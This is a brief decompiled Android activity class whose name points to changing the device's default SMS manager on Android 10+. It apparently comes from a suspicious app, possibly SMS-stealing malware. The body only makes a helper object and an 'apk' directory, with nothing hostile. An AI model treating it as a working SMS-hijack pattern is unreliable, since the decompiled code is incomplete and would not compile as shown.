package com.example.mmm.Activity;

import android.app.*;
import android.os.*;
import com.example.mmm.Utils.*;

public class activity_change_sms_manager_sdk_Q extends Activity
{
    public activity_change_sms_manager_sdk_Q() {
        super();
    }
    
    protected void onCreate(final Bundle bundle) {
        super.onCreate(bundle);
        if (Build$VERSION.SDK_INT >= 29) {
            final utils utils = new utils();
            this.getDir("apk", 0);
            return;
        }
        this.finish();
    }
}
